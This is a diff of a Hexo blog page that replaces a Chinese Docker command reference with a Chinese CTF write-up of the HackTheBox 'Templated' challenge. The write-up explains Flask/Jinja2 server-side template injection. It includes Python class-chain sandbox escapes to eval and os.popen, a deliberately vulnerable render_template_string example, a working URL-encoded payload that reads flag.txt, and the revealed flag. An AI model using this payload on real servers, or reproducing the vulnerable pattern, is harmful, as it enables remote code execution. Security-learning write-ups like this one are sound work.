@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>docker命令大全-rootfs命令及镜像仓库 |  欲</title>
+      <title>Templated |  欲</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -54,7 +54,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-docker命令大全-容器rootfs命令与镜像仓库"
+  id="post-Templated"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -65,7 +65,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  docker命令大全-rootfs命令及镜像仓库
+  Templated
 </h1>
  
 
@@ -73,9 +73,13 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/10/05/docker%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8-%E5%AE%B9%E5%99%A8rootfs%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93/" class="article-date">
-  <time datetime="2021-10-05T14:45:23.000Z" itemprop="datePublished">2021-10-05</time>
-</a>  
+      <a href="/2022/08/27/Templated/" class="article-date">
+  <time datetime="2022-08-27T11:27:02.000Z" itemprop="datePublished">2022-08-27</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+  </div>
+ 
     </div>
       
     <div class="tocbot"></div>
@@ -86,99 +90,107 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="容器rootfs命令"><a href="#容器rootfs命令" class="headerlink" title="容器rootfs命令"></a>容器rootfs命令</h1><p>本文取自<a target="_blank" rel="noopener" href="https://www.runoob.com/docker/docker-rm-command.html">https://www.runoob.com/docker/docker-rm-command.html</a>，博主整理这些命令主要是方便自己或其他需要的人来查阅</p>
-<p>（1）docker commit :从容器创建一个新的镜像。</p>
-<p>语法<br>docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]<br>OPTIONS说明：</p>
-<p>-a :提交的镜像作者；</p>
-<p>-c :使用Dockerfile指令来创建镜像；</p>
-<p>-m :提交时的说明文字；</p>
-<p>-p :在commit时，将容器暂停。</p>
+  <h1 id="Flask-Jinja2框架的ssti漏洞-沙箱逃逸-CVE-2019-8341"><a href="#Flask-Jinja2框架的ssti漏洞-沙箱逃逸-CVE-2019-8341" class="headerlink" title="Flask/Jinja2框架的ssti漏洞(沙箱逃逸)(CVE-2019-8341)#"></a>Flask/Jinja2框架的ssti漏洞(沙箱逃逸)(CVE-2019-8341)#</h1><h3 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1.背景介绍"></a>1.背景介绍</h3><p>flask是基于python开发的一种web服务器。</p>
 <span id="more"></span>
-<p>实例<br>将容器a404c6c174a2 保存为新的镜像,并添加提交人信息和说明信息。</p>
-<pre><code>runoob@runoob:~$ docker commit -a &quot;runoob.com&quot; -m &quot;my apache&quot; a404c6c174a2  mymysql:v1 
-sha256:37af1236adef1544e8886be23010b66577647a40bc02c0885a6600b33ee28057
-runoob@runoob:~$ docker images mymysql:v1
-REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
-mymysql             v1                  37af1236adef        15 seconds ago      329 MB
+<p>JinJia模板引擎的特点：</p>
+<pre><code>- &#123;&#123;……&#125;&#125;：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉
+- &#123;%……%&#125;：装载一个控制语句。
+- &#123;#……#&#125;：装载一个注释，模板渲染时会忽略这中间的值
 </code></pre>
-<hr>
-<p>（2）docker cp :用于容器与主机之间的数据拷贝。</p>
-<p>语法<br>docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-</p>
-<p>docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH</p>
-<p>OPTIONS说明：</p>
-<p>-L :保持源目标中的链接</p>
-<p>实例<br>将主机/www/runoob目录拷贝到容器96f7f14e99ab的/www目录下。</p>
-<p>docker cp /www/runoob 96f7f14e99ab:/www/</p>
-<p>将主机/www/runoob目录拷贝到容器96f7f14e99ab中，目录重命名为www。</p>
-<p>docker cp /www/runoob 96f7f14e99ab:/www</p>
-<p>将容器96f7f14e99ab的/www目录拷贝到主机的/tmp目录中。</p>
-<p>docker cp  96f7f14e99ab:/www /tmp/</p>
-<hr>
-<p>（3）docker diff : 检查容器里文件结构的更改。</p>
-<p>语法</p>
-<p>docker diff [OPTIONS] CONTAINER</p>
-<p>实例<br>查看容器mymysql的文件结构更改。</p>
-<pre><code> runoob@runoob:~$ docker diff mymysql
- A /logs
- A /mysql_data
- C /run
- C /run/mysqld
- A /run/mysqld/mysqld.pid
- A /run/mysqld/mysqld.sock
- C /tmp
+<h3 id="2-python魔术方法下的解析过程"><a href="#2-python魔术方法下的解析过程" class="headerlink" title="2.python魔术方法下的解析过程"></a>2.python魔术方法下的解析过程</h3><p>一些特殊的变量（python魔术方法）</p>
+<pre><code>__class__  返回类型所属的对象
+__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
+__base__   返回该对象所继承的基类
+// __base__和__mro__都是用来寻找基类的    
+__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
+__init__  类的初始化方法
+__globals__  对包含函数全局变量的字典的引用
+_ _ str _ _ 方法：将对象转换成字符串。
+_ _ new _ _ 方法：创建并返回一个实例对象，一般用于单例模式。
+_ _ del _ _ 方法：对象在程序运行结束后进行对象的销毁的时候调用这个方法，来释放资源。
+__dict__ 返回所有属性，包括属性，方法等
+
+&gt;&gt;&gt; print(&#39;&#39;.__class__)
+&lt;type &#39;str&#39;&gt;
+# 字符串的上一层父类就是str，既然我们知道了是什么类型，那么就可以通过__mro__找str的继承关系
+
+&gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__)
+(&lt;type &#39;type&#39;&gt;, &lt;type &#39;object&#39;&gt;)
+# 这里通过元组列出了两个关系，我们要找的不是type，而是后面的object，既然是元组，那么就通过__mro__[1].__subclasses__()找object对象下的所有子类
+
+&gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__[1].__subclasses__())
+[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, ...(省略部分)]
+# 找到了父类下的子类，以列表的形式显示，假设我们要进行文件读取，那么就是找到&lt;type &#39;file&#39;&gt;，所处列表位置是40  但是由于我的环境问题，这里不能的文件读取和RCE出现了问题，所以使用别的模块，道理都一样，通过找到重载的模块去一步步找所属的子类列表，这里使用的是列表第75位，已重载的
+
+&gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__[1].__subclasses__()[75])
+&lt;type &#39;file&#39;&gt;
+# 那么接下来就可以通过__init__查看是否重载
+
+&gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__[1].__subclasses__()[75].__init__)
+&lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;
+# 没有wrapper字眼，说明已经被重载了，接下来继续找继承关系，使用__globals__找全局变量
+
+&gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__)
+&#123;&#39;__name__&#39;: &#39;importlib._bootstrap&#39;, &#39;__doc__&#39;: &#39;Core implementation of import.\n\nThis module is NOT meant to be directly imported! It has been designed such\nthat it can be bootstrapped into Python as the implementation of import. As\nsuch it requires the injection of specific modules and attributes in order to\nwork. One should use importlib as the public-facing version of this module.\n\n&#39;, &#39;__package__&#39;: &#39;importlib&#39;, &#39;__loader__&#39;: &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &#39;__spec__&#39;: ModuleSpec(name=&#39;_frozen_importlib&#39;, loader=&lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;,...(省略部分))
+# 找出了很多的全局变量，以字典的形式输出，这里演示用&#39;__builtion__&#39;做演示
+ 
+&gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;])
+ 
+ &#123;&#39;__name__&#39;: &#39;builtins&#39;, &#39;__doc__&#39;: &quot;Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil&#39; object; Ellipsis represents `...&#39; in slices.&quot;, &#39;__package__&#39;: &#39;&#39;, &#39;__loader__&#39;: &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &#39;__spec__&#39;: ModuleSpec(name=&#39;builtins&#39;, loader=&lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;),...(省略部分)&#125;
+ # 到了这一步后，由于全局变量包含了eval，所以可以找到eval执行命令，然后再通过popen执行命令，如果使用system之类的函数，可能照成不会回显，所以用popen是首选~
+ 
+&gt;&gt;&gt; print(&#39;&#39;.__class__.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;))
+flag requirements.txt
+# 至此，成功执行了命令，找到了当前目录下的文件，至于__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()，可以说是固定搭配
 </code></pre>
-<hr>
-<h1 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h1><p>（1）docker login : 登陆到一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub</p>
-<p>docker logout : 登出一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub</p>
-<p>语法<br>docker login [OPTIONS] [SERVER]</p>
-<p>docker logout [OPTIONS] [SERVER]</p>
-<p>OPTIONS说明：</p>
-<p>-u :登陆的用户名</p>
-<p>-p :登陆的密码</p>
-<p>实例<br>登陆到Docker Hub</p>
-<p>docker login -u 用户名 -p 密码</p>
-<p>登出Docker Hub</p>
-<p>docker logout</p>
-<hr>
-<p>（2）docker pull : 从镜像仓库中拉取或者更新指定镜像</p>
-<p>语法<br>docker pull [OPTIONS] NAME[:TAG|@DIGEST]</p>
-<p>OPTIONS说明：</p>
-<p>-a :拉取所有 tagged 镜像</p>
-<p>–disable-content-trust :忽略镜像的校验,默认开启</p>
-<p>实例<br>从Docker Hub下载java最新版镜像。</p>
-<p>docker pull java</p>
-<p>从Docker Hub下载REPOSITORY为java的所有镜像。</p>
-<p>docker pull -a java</p>
-<hr>
-<p>（3）docker push : 将本地的镜像上传到镜像仓库,要先登陆到镜像仓库</p>
-<p>语法<br>docker push [OPTIONS] NAME[:TAG]</p>
-<p>OPTIONS说明：</p>
-<p>–disable-content-trust :忽略镜像的校验,默认开启</p>
-<p>实例<br>上传本地镜像myapache:v1到镜像仓库中。</p>
-<p>docker push myapache:v1</p>
-<hr>
-<p>（4）docker search : 从Docker Hub查找镜像</p>
-<p>语法<br>docker search [OPTIONS] TERM</p>
-<p>OPTIONS说明：</p>
-<p>–automated :只列出 automated build类型的镜像；</p>
-<p>–no-trunc :显示完整的镜像描述；</p>
-<p>-f &lt;过滤条件&gt;:列出收藏数不小于指定值的镜像。</p>
-<p>实例<br>从 Docker Hub 查找所有镜像名包含 java，并且收藏数大于 10 的镜像</p>
-<pre><code>runoob@runoob:~$ docker search -f stars=10 java
-NAME                  DESCRIPTION                           STARS   OFFICIAL   AUTOMATED
-java                  Java is a concurrent, class-based...   1037    [OK]       
-anapsix/alpine-java   Oracle Java 8 (and 7) with GLIBC ...   115                [OK]
-develar/java                                                 46                 [OK]
-isuper/java-oracle    This repository contains all java...   38                 [OK]
-lwieske/java-8        Oracle Java 8 Container - Full + ...   27                 [OK]
-nimmis/java-centos    This is docker images of CentOS 7...   13                 [OK]
+<p>循环渐进，一层找一层，无非都是先找到父类，然后找父类下的子类，完了以后查看是否有重载，再通过全局变量找到eval进行执行命令，当然，也不单单只有这么一个思路，也可以不断横纵扩展，还有一个知识点就是，上面提到我们得先获取object对象，然后再去找子类，那么一定要用mro去获取父类么？其实不一定，我们也可以用base去获取object，但是个人感觉还是mro好用，base虽然也可以父类，但是只能找上一层的父类，如果被找的类型不止一个父类的话，就得通过很多个base去找。</p>
+<pre><code>&gt;&gt;&gt; print(&#39;&#39;.__class__.__base__.__base__) # 依次网上找
+&lt;type &#39;object&#39;&gt;
+
+&gt;&gt;&gt; print(&#39;&#39;.__class__.__mro__[-1]) # 一次性列出来所有继承关系
+&lt;type &#39;object&#39;&gt;
 </code></pre>
-<p>参数说明：</p>
-<p>NAME: 镜像仓库源的名称</p>
-<p>DESCRIPTION: 镜像的描述</p>
-<p>OFFICIAL: 是否 docker 官方发布</p>
-<p>stars: 类似 Github 里面的 star，表示点赞、喜欢的意思。</p>
-<p>AUTOMATED: 自动构建。</p>
+<h3 id="3-漏洞详情："><a href="#3-漏洞详情：" class="headerlink" title="3.漏洞详情："></a>3.漏洞详情：</h3><p>ssti漏洞主要是由render_template_string()和render_template（）这两个函数由于使用不当而造成的二次渲染。</p>
+<pre><code>    #flaskapp.py
+    from flask import *
+    from jinja2 import *
+    app = Flask(__name__)  # 创建FLask类
+    @app.route(&quot;/&quot;)  #设置的默认路由
+    def index(): #默认的视图函数，与路由绑定，用来处理用户访问网站跟目录/时的情况
+        name = request.args.get(&#39;name&#39;, &#39;guest&#39;)#接受参数名为name 的参数传入
+        html = &#39;&#39;&#39;
+        &lt;h3&gt;your input %s&lt;/h3&gt;
+        &#39;&#39;&#39;%name #设置一个模板html，将name的值以%s输出
+        return render_template_string(html) #将html以字符串模板的形式渲染
+        #对应的，当html是一个文件时，使用render_template 函数来渲染一个指定的文件
+    if __name__==&#39;__main__&#39;: #作为主文件启动时
+        app.run(debug = True)  #以debug模式运行
+</code></pre>
+<p>route装饰器的作用是将函数与url绑定起来。如上，如果你在url后对name进行get传值:</p>
+<p>?name=2*3</p>
+<pre><code>输出：your input 2*3
+</code></pre>
+<p>?name=6</p>
+<pre><code>输出：your input 6
+</code></pre>
+<h3 id="4-题目Templated"><a href="#4-题目Templated" class="headerlink" title="4.题目Templated"></a>4.题目Templated</h3><pre><code>Site still under construction
+
+Proudly powered by Flask/Jinja2
+</code></pre>
+<p>刚进去就提醒你这是由Flask/Jinja2框架开发的。</p>
+<p>=9</p>
+<pre><code>Error 404
+
+The page &#39;=9&#39; could not be found
+</code></pre>
+<p>成功执行，证实存在SSTI注入。构造payload</p>
+<pre><code>payload:http://209.97.177.45:30351/%7B%7B%20%22%22.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[%22__builtins__%22][%22__import__%22](%22os%22).popen(%22cat%20flag.txt%22).read()%20%7D%7D
+</code></pre>
+<p>爆出flag</p>
+<pre><code>Error 404
+
+The page &#39;HTB&#123;t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!&#125; &#39; could not be found
+</code></pre>
  
       <!-- reward -->
       
@@ -249,7 +261,7 @@ nimmis/java-centos    This is docker images of CentOS 7...   13                 
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/10/05/docker%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8-%E5%AE%B9%E5%99%A8rootfs%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/08/27/Templated/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -262,19 +274,10 @@ nimmis/java-centos    This is docker images of CentOS 7...   13                 
    
   <nav class="article-nav">
     
-      <a href="/2021/10/05/docker%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8-%E5%AE%B9%E5%99%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            docker命令大全-容器生命周期管理
-          
-        </div>
-      </a>
     
-    
-      <a href="/2021/10/05/docker%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8-%E5%AE%B9%E5%99%A8%E6%93%8D%E4%BD%9C/" class="article-nav-link">
+      <a href="/2022/08/02/CISCN-2022-web/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">docker命令大全-容器操作</div>
+        <div class="article-nav-title">CISCN_2022_web</div>
       </a>
     
   </nav>
